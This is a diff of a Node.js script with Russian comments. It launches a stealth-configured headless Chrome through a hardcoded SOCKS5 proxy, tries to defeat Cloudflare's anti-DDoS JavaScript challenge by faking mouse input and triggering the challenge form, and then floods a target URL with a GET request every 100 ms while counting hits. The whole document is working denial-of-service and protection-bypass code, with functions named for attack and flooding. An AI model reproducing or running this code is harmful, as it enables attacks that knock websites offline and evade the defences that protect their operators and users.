@@ -1,67 +1,70 @@
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
-const axios = require('axios');
-const fs = require('fs');
 const { SocksProxyAgent } = require('socks-proxy-agent');
+const axios = require('axios');
 
-// Глубокая настройка stealth
+// Инициализация
+const PROXY = 'socks5://64.69.43.232:1080';
+const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+
+// Конфигурация stealth
 const stealth = StealthPlugin();
 stealth.enabledEvasions.delete('user-agent-override');
 puppeteer.use(stealth);
 
-// Конфигурация
-const PROXY = 'socks5://64.69.43.232:1080'; // SOCKS5 лучше для Cloudflare
-const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
-const TIMEOUT = 90000; // 90 секунд
+async function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
 
 async function launchBrowser() {
-    const agent = new SocksProxyAgent(PROXY);
-    
     return await puppeteer.launch({
-        headless: 'new',
+        headless: true,
         args: [
             '--no-sandbox',
             '--disable-setuid-sandbox',
             '--disable-dev-shm-usage',
-            '--disable-accelerated-2d-canvas',
             `--proxy-server=${PROXY.split('://')[1]}`,
+            '--disable-gpu',
             '--lang=en-US,en'
         ],
-        ignoreHTTPSErrors: true,
-        executablePath: '/usr/bin/google-chrome'
+        ignoreHTTPSErrors: true
     });
 }
 
-async function bypassProtection(page, targetUrl) {
+async function solveCloudflare(page) {
     try {
-        console.log('🔄 Обход защиты...');
+        console.log('Обход защиты Cloudflare...');
         
-        // Улучшенная эмуляция человеческого поведения
+        // Проверка наличия challenge
+        const challengeForm = await page.$('#challenge-form');
+        if (!challengeForm) return true;
+
+        // Эмуляция человеческого поведения
         await page.mouse.move(100, 100);
-        await page.waitForTimeout(2000);
+        await sleep(2000);
         await page.mouse.click(100, 100, { delay: 150 });
         
-        // Решение JS-челленджей
+        // Решение JavaScript challenge
         await page.evaluate(() => {
             if (typeof window.___cf_chl_opt === 'object') {
                 window.___cf_chl_opt.onLoad();
             }
+            document.querySelector('#challenge-form input[type="submit"]')?.click();
         });
         
-        await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: TIMEOUT });
+        await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 60000 });
         return true;
     } catch (error) {
-        console.error('⚠️ Ошибка обхода:', error.message);
+        console.error('Ошибка при обходе:', error.message);
         return false;
     }
 }
 
-async function attack() {
+async function runAttack() {
     const targetUrl = 'https://uam.dstat123.uk/91d3e5fd-1b84-46ae-8273-5447dd8fe535';
     let browser;
-    
+
     try {
-        console.log('🚀 Запуск браузера...');
         browser = await launchBrowser();
         const page = await browser.newPage();
         
@@ -72,35 +75,32 @@ async function attack() {
             'Sec-Ch-Ua': '"Chromium";v="120", "Google Chrome";v="120"'
         });
 
-        console.log(`🌐 Переход на ${targetUrl}`);
+        console.log('Переход на целевой URL...');
         await page.goto(targetUrl, {
             waitUntil: 'domcontentloaded',
-            timeout: TIMEOUT
+            timeout: 60000
         });
 
-        // Проверка защиты
-        const title = await page.title();
-        if (title.includes('Just a moment') || title.includes('DDoS protection')) {
-            if (!await bypassProtection(page, targetUrl)) {
-                throw new Error('Не удалось обойти защиту');
-            }
+        // Обход защиты
+        if (!await solveCloudflare(page)) {
+            throw new Error('Cloudflare блокирует доступ');
         }
 
-        console.log('✅ Успешное подключение. Начинаем флуд...');
-        startFlood(targetUrl);
+        console.log('Успешное подключение! Начинаем флуд...');
+        startRequests(targetUrl);
 
     } catch (error) {
-        console.error(`💥 Критическая ошибка: ${error.message}`);
+        console.error('Ошибка:', error.message);
     } finally {
         if (browser) await browser.close();
     }
 }
 
-function startFlood(targetUrl) {
+function startRequests(targetUrl) {
     const agent = new SocksProxyAgent(PROXY);
-    let successCount = 0;
-    
-    const flood = setInterval(async () => {
+    let count = 0;
+
+    const interval = setInterval(async () => {
         try {
             await axios.get(targetUrl, {
                 httpsAgent: agent,
@@ -110,18 +110,18 @@ function startFlood(targetUrl) {
                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                 }
             });
-            successCount++;
+            count++;
             process.stdout.write('.');
-        } catch (e) {
+        } catch {
             process.stdout.write('x');
         }
     }, 100);
 
     // Статистика
     setInterval(() => {
-        console.log(`\n📊 Успешных запросов: ${successCount}`);
+        console.log(`\nУспешных запросов: ${count}`);
     }, 10000);
 }
 
 // Запуск
-attack().catch(console.error);
+runAttack().catch(console.error);
